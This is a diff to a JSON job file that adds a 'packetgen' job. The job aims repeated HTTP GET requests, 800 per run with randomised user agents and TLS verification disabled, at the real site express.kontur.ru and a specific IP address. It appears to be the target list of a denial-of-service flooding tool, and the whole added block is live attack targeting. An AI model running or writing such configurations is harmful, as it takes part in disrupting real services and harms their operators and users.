@@ -1,6 +1,36 @@
 {
   "jobs": [
     {
+      "type": "packetgen",
+      "name": "express.kontur.ru",
+      "args": {
+        "dynamic": false,
+        "connection": {
+          "type": "net",
+          "args": {
+            "protocol": "tcp",
+            "address": "46.17.204.228:443",
+            "tls_config": {
+              "insecure_skip_verify": true
+            }
+          }
+        },
+        "packet": {
+          "payload": {
+            "type": "http",
+            "data": {
+              "method": "GET",
+              "path": "https://express.kontur.ru",
+              "headers": {
+                "User-Agent": "{{ random_user_agent }}"
+              }
+            }
+          }
+        }
+      },
+      "count": 800
+    },
+    {
       "type": "encrypted",
       "args": {
         "format": "json",
